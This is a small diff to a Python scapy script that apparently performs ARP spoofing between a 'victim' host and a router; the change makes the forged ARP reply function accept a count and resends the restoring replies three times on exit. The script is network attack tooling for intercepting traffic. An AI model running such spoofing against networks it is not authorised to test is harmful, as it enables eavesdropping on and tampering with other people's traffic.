@@ -8,11 +8,11 @@ from scapy.all import *
 import time
 
 
-def arp_reply(dest_ip, src_ip, mac):
+def arp_reply(dest_ip, src_ip, mac, count=1):
     print("Telling {} that {} is at {}".format(src_ip, dest_ip, mac))
     ARP_REPLY_CODE = 2
     arp = ARP(op=ARP_REPLY_CODE, psrc=src_ip, pdst=dest_ip, hwdst=mac)
-    send(arp, verbose=False)
+    send(arp, verbose=False, count=count)
 
 
 def get_mac(ip):
@@ -77,8 +77,8 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         # Restore original mappings
         print("Restoring original macs...")
-        arp_reply(router_ip, victim_ip, original_macs[victim_ip])
-        arp_reply(victim_ip, router_ip, original_macs[router_ip])
+        arp_reply(router_ip, victim_ip, original_macs[victim_ip], count=3)
+        arp_reply(victim_ip, router_ip, original_macs[router_ip], count=3)
         set_ip_forwarding(False)
         print("Done")
 
